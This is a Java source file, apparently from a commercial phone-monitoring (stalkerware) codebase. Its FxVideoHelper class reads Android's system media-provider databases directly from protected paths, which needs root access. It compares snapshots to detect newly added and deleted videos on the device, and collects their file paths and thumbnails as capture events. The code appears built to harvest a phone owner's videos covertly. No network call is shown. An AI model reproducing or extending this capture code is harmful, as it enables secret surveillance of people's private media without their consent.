package com.vvt.capture.video;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.provider.BaseColumns;
import android.provider.MediaStore;
import android.provider.MediaStore.MediaColumns;
import android.provider.MediaStore.Video.VideoColumns;

import com.vvt.base.FxEvent;
import com.vvt.events.FxMediaDeletedEvent;
import com.vvt.events.FxMediaType;
import com.vvt.events.FxMimeTypeParser;
import com.vvt.events.FxThumbnail;
import com.vvt.events.FxVideoFileThumbnailEvent;
import com.vvt.ioutil.FileUtil;
import com.vvt.ioutil.Path;
import com.vvt.logger.FxLog;
import com.vvt.stringutil.FxStringUtils;

public class FxVideoHelper {
	private final static String TAG = "FxVideoHelper";
	
	private static final boolean VERBOSE = true;
	private static final boolean LOGV = Customization.VERBOSE ? VERBOSE : false;
	private static final boolean LOGD = Customization.DEBUG;
	private static final boolean LOGW = Customization.WARNING;
	private static final boolean LOGE = Customization.ERROR;
	
	private final static File [] FOLDER_DIRS  =  {
		new File("/data/data/com.android.providers.media/databases/"),
		new File("/dbdata/databases/com.android.providers.media/"), // Samgsung
	};
	
	private final static String INTERNAL_FILENAME_START_PREFIX = "internal";
	private final static String EXTERNAL_FILENAME_START_PREFIX = "external";
	//private static final String PACKAGE_NAME = "com.android.providers.media";
	//change to public for use in media history capture.
	public static final String VIDEO_TABLE_NAME = "video";
	private static final String VIDEO_THUMBNAILS_TABLE_NAME = "videothumbnails";
	
	public static SQLiteDatabase getReadableDatabase(String dbFile) {
		return openDatabase(dbFile, SQLiteDatabase.OPEN_READONLY | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	public static SQLiteDatabase getWritableDatabase(String dbFile) {
		return openDatabase(dbFile, SQLiteDatabase.OPEN_READWRITE | SQLiteDatabase.NO_LOCALIZED_COLLATORS);
	}
	
	private static SQLiteDatabase openDatabase(String dbFile, int flags) {
		if(LOGV) FxLog.v(TAG, "openDatabase # START");
		
		SQLiteDatabase db = tryOpenDatabase(dbFile, flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGV) FxLog.d(TAG, "Cannot open database. Retrying ...");
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(dbFile, flags);
			
			attemptLimit--;
		}
		
		if(LOGV) FxLog.v(TAG, "openDatabase # EXIT");
		return db;
	}
	
	/*private static SQLiteDatabase openDatabase(String dbFile, int flags) {
		if(LOGV) FxLog.v(TAG, "openDatabase # ENTER ...");
		
		String dbPath = VtDatabaseHelper.getSystemDatabasePath(PACKAGE_NAME);
		if (dbPath != null) {
			dbPath = String.format("%s/%s", dbPath, dbFile);
		}
		
		if(LOGV) FxLog.v(TAG, String.format("openDatabase # sDbPath: %s", dbPath));
		
		SQLiteDatabase db = tryOpenDatabase(dbPath, flags);
		
		int attemptLimit = 5;
		
		while (db == null && attemptLimit > 0) {
			if(LOGW) FxLog.w(TAG, "Cannot open database. Retrying ...");
			try {
				Thread.sleep(1000);
			} 
			catch (InterruptedException e) {
				// Do nothing
			}
			
			db = tryOpenDatabase(dbPath, flags);
			
			attemptLimit--;
		}
		
		if(LOGV) FxLog.v(TAG, "openDatabase # EXIT ...");
		return db;
	}*/
	
	private static SQLiteDatabase tryOpenDatabase(String dbPath, int flags) {
		SQLiteDatabase db = null;
		try {
			
			if(!new File(dbPath).exists()) {
				if(LOGE) FxLog.e(TAG, dbPath + " does not exist!");
			}
			
			db = SQLiteDatabase.openDatabase(dbPath, null, flags);
		}
		catch (SQLiteException e) {
			if(LOGE) FxLog.e(TAG, null, e);
		}
		return db;
	}
	
	public static String getExternalDatabaseFilePath() {
		if(LOGV) FxLog.v(TAG, "getExternalDatabaseFilePath # START");
//		String filePath = null;
//		boolean pathFound = false;
		
//		for (File f : FOLDER_DIRS) {
//			if(f.exists()) {
//				File[] listOfFiles = f.listFiles();
//				
//				for (int i = 0; i < listOfFiles.length; i++) {
//					File file = listOfFiles[i];
//
//					if (file.getName().startsWith(EXTERNAL_FILENAME_START_PREFIX)) {
//						filePath = file.getName();
//						pathFound = true;
//					}
//				}
//			}
//		}
		
		StringBuilder foundPath = new StringBuilder();
		boolean isSuccess = FileUtil.findFileInFolders(FOLDER_DIRS, EXTERNAL_FILENAME_START_PREFIX, foundPath, "db");
		
		
		if(!isSuccess)
			if(LOGE) FxLog.e(TAG, "getExternalDatabaseFilePath # ExternalDatabaseFilePath Not found!");
		else
			if(LOGD) FxLog.v(TAG, "getExternalDatabaseFilePath # filePath :" + foundPath.toString());
		
		if(LOGV) FxLog.v(TAG, "getExternalDatabaseFilePath # EXIT");
		return foundPath.toString();
	}
	
	public static String getInternalDatabaseFilePath() {
		if(LOGV) FxLog.v(TAG, "getInternalDatabaseFilePath # START");
		
		/*boolean pathFound = false;
		String filePath = null;
		
		for (File f : FOLDER_DIRS) {
			if (f.exists()) {
				File[] listOfFiles = f.listFiles();
				for (int i = 0; i < listOfFiles.length; i++) {
					File file = listOfFiles[i];
					if (file.getName().startsWith(INTERNAL_FILENAME_START_PREFIX)) {
						filePath = file.getName();
						pathFound = true;
					}
				}
			}
		}		*/
		
		StringBuilder foundPath = new StringBuilder();
		boolean isSuccess = FileUtil.findFileInFolders(FOLDER_DIRS, INTERNAL_FILENAME_START_PREFIX, foundPath, "db");
		

		if(!isSuccess)
			if(LOGE) FxLog.e(TAG, "getInternalDatabaseFilePath # getInternalDatabaseFilePath Not found!");
		else
			if(LOGV) FxLog.v(TAG, "getExternalDatabaseFilePath # filePath :" + foundPath.toString());
		
		if(LOGV) FxLog.v(TAG, "getInternalDatabaseFilePath # EXIT");
		return foundPath.toString();
	}

	public static ArrayList<FxEvent> getWhatsNew(String writablePath, String dbFile, HashMap<Long, String> oldMap, HashMap<Long, String> newMap)
	{
		if(LOGV) FxLog.v(TAG, "getWhatsNew # START");
		
		ArrayList<FxEvent> newEvents = new ArrayList<FxEvent>();

		if(oldMap == null || newMap == null)
			return newEvents;
		
		for (Map.Entry<Long, String> e : newMap.entrySet()) {
			if (!oldMap.keySet().contains(e.getKey())) {
				// Is a new id. query
				long VideoId = e.getKey();
				if(LOGV) FxLog.v(TAG, "getWhatsNew # new VideoId:" + VideoId);
				
				List<FxEvent> events = getNewerMediaById(writablePath, dbFile, VideoId);
				newEvents.addAll(events);
			}
		}

		if(LOGV) FxLog.v(TAG, "getWhatsNew # EXIT");
		return newEvents;
	}
	
	public static List<FxEvent> getNewerMediaById(String writablePath, String dbFile, long refId) {
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # START");
		
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # writablePath:" + writablePath);
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # dbFile:" + dbFile);
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # refId:" + refId);
		
		List<FxEvent> medias = new ArrayList<FxEvent>();

		String selection = String.format("%s = %d", FxVideoDatabaseHelper._ID, refId);
		
		SQLiteDatabase db =  getReadableDatabase(dbFile);
		Cursor cursor = null;
		
		try {
			cursor = db.query(VIDEO_TABLE_NAME, null, selection, null, null, null, null);
			
			if (cursor == null) {
				return null;
			}

			FxVideoFileThumbnailEvent media = null;

			while (cursor.moveToNext()) {
				final int orginRowId = cursor.getInt(cursor.getColumnIndexOrThrow(BaseColumns._ID));
				final String fileName = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.DATA));
				final String mimeType = cursor.getString(cursor.getColumnIndexOrThrow(MediaColumns.MIME_TYPE));
				final int actualDuration = cursor.getInt(cursor.getColumnIndexOrThrow(VideoColumns.DURATION));
				final FxMediaType format = FxMimeTypeParser.parse(mimeType);
				final long eventTime = new Date().getTime();
				long actualSize = cursor.getLong(cursor.getColumnIndexOrThrow(MediaColumns.SIZE));
				
				File f = new File(fileName); 
				if (!f.exists()) {
					continue;
				}
				
				if(actualSize <= 0) {
					actualSize = f.length();
				}

				media = new FxVideoFileThumbnailEvent();
				media.setEventId(orginRowId);
				media.setEventTime(eventTime);
				media.setActualFileSize(actualSize);
				media.setFormat(format);
				media.setParingId(orginRowId);
				media.setActualDuration(actualDuration);
				media.setActualFullPath(fileName);

				List<String> thumbs =  getVideoThumbnailPath(db, orginRowId);
				
				if (thumbs.size() > 0) {
					for (String path : thumbs) {
						if (new File(path).exists()) {
							if (!FxStringUtils.isEmptyOrNull(path)) {
								FxThumbnail thumbnail = new FxThumbnail();
								thumbnail.setImageData(null);
								thumbnail.setThumbnailPath(path);
								media.addThumbnail(thumbnail);
								medias.add(media);

								if(LOGV) FxLog.v(TAG,"getNewerMediaById # videoPath thumb:"  + path);
							}
						}
					}
				}
				
				if(LOGV) { 
					FxLog.v(TAG,"getNewerMediaById # orginRowId:"  + orginRowId);
					FxLog.v(TAG,"getNewerMediaById # eventTime:"  + eventTime);
					FxLog.v(TAG,"getNewerMediaById # actualSize:"  + actualSize);
					FxLog.v(TAG,"getNewerMediaById # format:"  + format);
					FxLog.v(TAG,"getNewerMediaById # ParingId:"  + orginRowId);
					FxLog.v(TAG,"getNewerMediaById # actualDuration:"  + actualDuration);
					FxLog.v(TAG,"getNewerMediaById # fileName:"  + fileName);
				}
				 
			}
		}
		finally {
			if(cursor != null)
				cursor.close();
			
			if(db != null)
				db.close();
		}
		
		if(LOGV) FxLog.v(TAG, "getNewerMediaById # EXIT");
		return medias;
	}
	
	public static String createVideoThumbnail(String writablePath, String fileName, long videoId) {
		if(LOGV) FxLog.v(TAG, "createVideoThumbnail # START");
		String filename = FxStringUtils.EMPTY;
		
		try {

			final int THUMBNAIL_SIZE = 96;
			Bitmap bitmap = BitmapFactory.decodeFile(fileName);

			if (bitmap != null) {
				bitmap = Bitmap.createScaledBitmap(bitmap, THUMBNAIL_SIZE, THUMBNAIL_SIZE, true);

				filename = getNewThumbnailPath(writablePath);
				FileOutputStream out;
 
				out = new FileOutputStream(filename);
				bitmap.compress(Bitmap.CompressFormat.PNG, 90, out);
			}
		}
		catch(Throwable t) {
			if(LOGE) FxLog.e(TAG, t.toString());
		}
		
		if(LOGV) FxLog.v(TAG, "createVideoThumbnail # new thumb location:" + filename);
		if(LOGV) FxLog.v(TAG, "createVideoThumbnail # EXIT");
		return filename;
	}
	
	private  static String getNewThumbnailPath(String writablePath) {
		String thumbnailFolder = Path.combine(writablePath, "thumbnails");
		File wallpaperDirectory = new File(thumbnailFolder);
		
		if(wallpaperDirectory.mkdirs())
			return Path.combine(thumbnailFolder, (wallpaperDirectory.hashCode() + Math.random()) + ".png" );
		else
			return Path.combine(writablePath, (wallpaperDirectory.hashCode() + Math.random()) + ".png" );
	}

	public static List<String> getVideoThumbnailPath(SQLiteDatabase db, long VideoId) {
		if(LOGV) FxLog.v(TAG, "getVideoThumbnailPath # START");
		
		final String[] THUMB_PROJECTION = new String[] {
			MediaStore.Video.Thumbnails.VIDEO_ID, // 1
			MediaStore.Video.Thumbnails.WIDTH,
			MediaStore.Video.Thumbnails.HEIGHT,
			MediaStore.Video.Thumbnails.DATA
			};
		
		final String selectionArgs = String.format("%s = %d", MediaStore.Video.Thumbnails.VIDEO_ID, VideoId);
		Cursor cursor = null;
		String thumbnailfilePath = FxStringUtils.EMPTY;
		List<String> thumbs = new ArrayList<String>();
		
		try {
			cursor = db.query(VIDEO_THUMBNAILS_TABLE_NAME, THUMB_PROJECTION, selectionArgs, null, null, null, null);
			
			if( cursor != null && cursor.getCount() > 0 ) {
			     
				while (cursor.moveToNext()) {
					thumbnailfilePath = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Thumbnails.DATA));
					thumbs.add(thumbnailfilePath);
				}
			}
		}
		finally {
			if(cursor != null)
				cursor.close();
		}
		
		if(LOGV) FxLog.v(TAG, "getVideoThumbnailPath # thumbnailfilePath:" + thumbnailfilePath);
		if(LOGV) FxLog.v(TAG, "getVideoThumbnailPath # EXIT");
		return thumbs;
	}
 
	public static ArrayList<FxEvent> getWhatsDeleted(HashMap<Long, String> oldMap, HashMap<Long, String> newMap) {
		ArrayList<FxEvent> newEvents = new ArrayList<FxEvent>();

		if (oldMap == null || newMap == null)
			return newEvents;

		for (Map.Entry<Long, String> e : oldMap.entrySet()) {
			if (!newMap.keySet().contains(e.getKey())) {
				// Is a new id. query
				long VideoId = e.getKey();
				FxMediaDeletedEvent mediaDeletedEvent = new FxMediaDeletedEvent();
				mediaDeletedEvent.setEventId(VideoId);
				mediaDeletedEvent.setFileName(e.getValue());
				mediaDeletedEvent.setEventTime(new Date().getTime());
				newEvents.add(mediaDeletedEvent);
			}
		}

		return newEvents;
	}
	 
	public synchronized static HashMap<Long, String> getAllVideos(String dbFile) throws NullPointerException {
		if(LOGV) FxLog.v(TAG, "getAllVideos # START");
		if(LOGV) FxLog.v(TAG, "getAllVideos # db:" + dbFile);
		
		HashMap<Long, String> map = new HashMap<Long, String>();
		
		long id = -1;
		String path = "";
		SQLiteDatabase db = getReadableDatabase(dbFile);
		Cursor cursor = null;
		
		try {
			if (db == null || db.isDbLockedByCurrentThread() || db.isDbLockedByOtherThreads()) {
				if(LOGV) FxLog.v(TAG, "getAllVideos # Open database FAILED!! -> EXIT ...");
				if (db != null) {
					db.close();
				}
				return map;
			}
			
			String sql = String.format("SELECT %s, %s FROM %s", FxVideoDatabaseHelper._ID,  FxVideoDatabaseHelper.PATH, VIDEO_TABLE_NAME);
			if(LOGV) FxLog.v(TAG, "getAllVideos # db sql is: " + sql);
			
			cursor = db.rawQuery(sql, null);

			if (cursor == null) {
				if(LOGW) FxLog.w(TAG, "getAllVideos # cursor is null");
				return map;
			}

			while (cursor.moveToNext()) {
				id = cursor.getLong(cursor.getColumnIndex(FxVideoDatabaseHelper._ID));
				path = cursor.getString(cursor.getColumnIndex(FxVideoDatabaseHelper.PATH));
				
				if(LOGV) FxLog.v(TAG, "getAllVideos # id:" + id);
				if(LOGV) FxLog.v(TAG, "getAllVideos # path:" + path);
				map.put(id, path);
			}
			
			if(LOGV) FxLog.v(TAG, "getAllVideos # cursor count:" + cursor.getCount());

			cursor.close();
		} catch (Exception e) {
			if(LOGE) FxLog.e(TAG, e.toString());
		}
		finally {
			if(cursor != null)
				cursor.close();
			
			if(db != null)
				db.close();
		}

		if(LOGV) FxLog.v(TAG, "getAllVideos # map size:" + map.size());
		if(LOGV) FxLog.v(TAG, "getAllVideos # EXIT");
		return map;
	}
	 
 


}
